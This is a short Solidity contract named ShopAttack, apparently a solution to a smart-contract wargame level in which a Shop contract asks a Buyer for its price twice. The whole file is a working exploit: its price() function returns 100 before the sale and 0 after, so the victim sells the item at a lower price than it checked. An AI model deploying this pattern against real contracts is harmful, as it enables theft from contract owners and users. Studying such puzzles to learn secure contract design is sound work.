// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack is Buyer {
    Shop victim;

    constructor(address _address) {
        victim = Shop(_address);
    }

    function attack() public {
        victim.buy();
    }

    function price() external view override returns (uint){
        uint price1;
        price1 = victim.isSold() ? 0 : 100;
        return price1;
    }

}
